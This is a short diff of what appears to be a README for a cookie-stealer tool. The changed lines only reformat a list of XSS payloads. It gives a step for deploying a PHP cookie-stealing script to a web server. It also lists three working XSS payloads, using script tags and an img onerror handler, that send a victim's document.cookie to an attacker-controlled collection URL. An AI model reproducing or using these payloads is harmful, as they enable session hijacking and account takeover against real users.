@@ -35,8 +35,8 @@ sudo mv cookiestealer-simple.php /var/www/html/
 Example: http://[Attacker Webserver]/cookiesteal-simple.php
 
 _XSS Payload Examples_:
-<script javascript:text>document.location="http://[Attacker Webserver]cookiesteal-simple.php?c=" + document.cookie + "&t=Alert"; </script>
+* <script javascript:text>document.location="http://[Attacker Webserver]cookiesteal-simple.php?c=" + document.cookie + "&t=Alert"; </script>
 
-<script>document.location='http://[Attacker Webserver]/cookiesteal-v.php?cookie=' + document.cookie</script>
+* <script>document.location='http://[Attacker Webserver]/cookiesteal-v.php?cookie=' + document.cookie</script>
 
-<img src=x onerror=this.src='http://[Attacker Webserver]/cookiesteal-v.php?cookie='+document.cookie>
+* <img src=x onerror=this.src='http://[Attacker Webserver]/cookiesteal-v.php?cookie='+document.cookie>
